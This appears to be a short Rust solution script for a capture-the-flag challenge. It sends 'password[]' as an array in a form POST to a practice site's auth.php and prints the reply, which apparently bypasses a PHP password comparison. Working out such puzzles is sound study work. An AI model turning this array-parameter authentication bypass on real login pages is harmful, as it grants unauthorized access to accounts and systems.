// cargo-deps: reqwest = "0.8.5"

extern crate reqwest;

use reqwest::Client;

fn main() {
    let client = Client::new();
    let params = [("password[]", "foo")];

    let mut response = client
        .post("http://ctfq.sweetduet.info:10080/~q32/auth.php")
        .form(&params)
        .send()
        .unwrap();
    let body = response.text().unwrap();

    println!("{}", body);
}
